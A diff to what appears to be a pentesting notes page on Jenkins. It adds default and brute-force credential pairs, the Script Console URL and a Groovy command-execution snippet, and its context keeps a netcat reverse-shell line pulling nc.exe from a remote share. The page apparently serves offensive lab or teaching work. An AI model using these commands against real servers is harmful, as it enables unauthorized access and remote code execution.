@@ -41,10 +41,17 @@ Without credentials it is possible to obtain some users.
 
 There are no default credentials but some times these works.
 
+> **Note**: Jenkins does **not have** any type of **account lockout** neither a **strong password policy** so you can try to brute force it.
+
 ```
 admin:admin
+admin:nimda
 admin:password
 admin:jenkins
+manager:manager
+manager:reganam
+manager:password
+manager:jenkins
 ```
 
 In new versions the password is randomized at installation. We can find the initial password here:
@@ -73,7 +80,20 @@ There are multiple ways in which from administrative privileges in Jenkins you c
 
 To obtain a Reverse shell we need to execute **`Manage Jenkins`** on **`Script Console.`**
 
+```
+http://<jenkins_server>/script
+```
+
 ![Jenking Script Console.](/hackingnotes/images/jenkins_scriptconsole.png)
+
+This is and example of Grovy Script to execute commands on the target machine, either windows or linux.
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'whoami'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
 
 ### Windows Reverse Shell
 
@@ -105,7 +125,9 @@ println "out> $sout err> $serr"
 
 ## Freestyle Project
 
-Go on **`New Item`** tab.
+We can create a new project or see if we can modify the configuration of an existant project.
+
+To create a new project go on **`New Item`** tab.
 
 ![Jenkins Dashboard](/hackingnotes/images/jenkins_newitem.png)
 
@@ -121,6 +143,7 @@ Introduce the reverse shell on the Command window and click **`Save`**.
 
 ```
 \\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10
+powershell.exe -c <command>
 ```
 
 Go to **`Build Now`** section.
@@ -129,7 +152,7 @@ Go to **`Build Now`** section.
 
 When the build is executed a new item will be displayed under the **`Build History`**.
 
-![Jenkins Build History.](/hackingnotes/images/jenkins_history)
+![Jenkins Build History.](/hackingnotes/images/jenkins_history.png)
 
 At that moment a reverse shell is obtained.
 
